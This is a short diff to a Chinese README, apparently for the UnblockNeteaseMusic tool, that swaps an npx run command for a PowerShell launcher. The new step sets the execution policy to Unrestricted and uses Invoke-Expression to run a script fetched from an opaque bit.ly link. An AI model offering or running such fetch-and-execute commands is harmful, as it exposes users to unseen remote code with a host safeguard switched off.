@@ -12,10 +12,11 @@
 
 ## 运行
 
-使用 npx
+使用 powershell 启动菜单
 
 ```
-$ npx @nondanee/unblockneteasemusic
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
+Invoke-Expression -Command (Invoke-WebRequest -UseBasicParsing -Uri https://bit.ly/2HodSU3).Content
 ```
 
 或使用 Docker
